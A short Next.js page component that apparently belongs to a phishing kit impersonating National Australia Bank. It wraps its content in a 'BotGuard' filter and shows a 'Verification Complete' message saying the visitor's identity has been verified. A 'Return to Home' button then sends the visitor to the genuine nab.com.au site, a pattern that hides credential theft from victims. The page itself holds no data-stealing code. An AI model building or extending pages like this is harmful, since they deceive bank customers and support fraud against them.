'use client';

import { BotGuard } from '@/components/security/BotGuard';

export default function CompletedPage() {
  return (
    <BotGuard>
      <div className="login-card">
        <h1 className="card-heading" style={{ textAlign: 'center' }}>Verification Complete</h1>

        <div className="login-form" style={{ textAlign: 'center' }}>
          <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '24px' }}>
            <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#000000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
              <polyline points="22 4 12 14.01 9 11.01"></polyline>
            </svg>
          </div>

          <p style={{ fontSize: '16px', lineHeight: '1.5', marginBottom: '24px' }}>
            Your identity has been verified.
            <br />
            You may now close this window or return to the home page.
          </p>

          <button
            onClick={() => window.location.href = 'https://www.nab.com.au'}
            className="btn-login"
            style={{ width: '100%', justifyContent: 'center' }}
          >
            Return to Home
          </button>
        </div>
      </div>
    </BotGuard>
  );
}
